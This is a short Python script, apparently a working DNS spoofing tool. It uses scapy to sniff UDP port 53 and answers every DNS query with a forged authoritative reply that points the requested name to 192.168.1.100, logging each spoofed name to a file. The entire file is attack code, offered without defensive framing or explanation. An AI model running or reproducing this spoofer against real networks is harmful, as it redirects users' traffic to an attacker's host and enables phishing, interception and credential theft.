from scapy.all import *
from dnslib import DNSRecord, QTYPE, RR, A
import logging

logging.basicConfig(filename='dns_spoofing.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def dns_spoof(packet):
    try:
        if packet.haslayer(DNS) and packet[DNS].qr == 0:
            spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                          UDP(dport=packet[UDP].sport, sport=53) / \
                          DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd, an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata='192.168.1.100'))
            send(spoofed_pkt)
            logging.info(f'Spoofed packet: {packet[DNS].qd.qname} to 192.168.1.100')
    except Exception as e:
        logging.error(f'Error spoofing DNS: {e}')

if __name__ == "__main__":
    try:
        logging.info('Starting DNS spoofing')
        sniff(filter="udp port 53", prn=dns_spoof)
        print("DNS spoofing complete. Check dns_spoofing.log for details.")
    except Exception as e:
        logging.error(f'Error starting DNS spoofing: {e}')
